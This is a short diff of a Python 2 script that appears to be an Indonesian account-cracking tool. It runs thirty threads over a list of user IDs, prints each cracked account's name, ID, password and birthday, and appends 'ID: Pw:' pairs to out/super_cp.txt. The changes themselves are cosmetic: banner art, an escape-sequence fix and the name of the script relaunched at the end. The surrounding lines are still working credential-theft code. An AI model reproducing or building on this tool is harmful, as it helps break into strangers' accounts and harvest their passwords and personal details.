@@ -428,7 +428,7 @@ def pilih_indo():
 							print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\33[1;33mName \x1c\033[1;91m    : \x1c\33[1;33m' + c['name']
 							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mID \x1c\033[1;91m      : \x1c\33[1;33m' + user
 							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mPassword \x1c\033[1;91m: \x1c\33[1;33m' + pass2 + '\n'
-							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
+							print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\33[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\33[1;33m' + c['birthday']
 							cek = open("out/super_cp.txt", "a")
 							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 							cek.close()
@@ -654,13 +654,13 @@ def pilih_indo():
 			
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;91m████████████████████████████████████████████████"
+	print "\033[1;91m︻╦デ╤╾━══════▶"
 	print '\033[1;97m[\033[1;93m✔\033[1;97m] \033[1;97mSelesai ....'
 	print"\033[1;97m[\033[1;93m✴\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print '\033[1;97m[\033[1;93m➹\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
-	print "\033[1;97m████████████████████████████████████████████████"
+	print "\033[1;97m◀═════╾━╤デ╦︻"
 	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
-	os.system("python2 newfile.py")
+	os.system("python2 Sundawani.py")
 	
 
 	
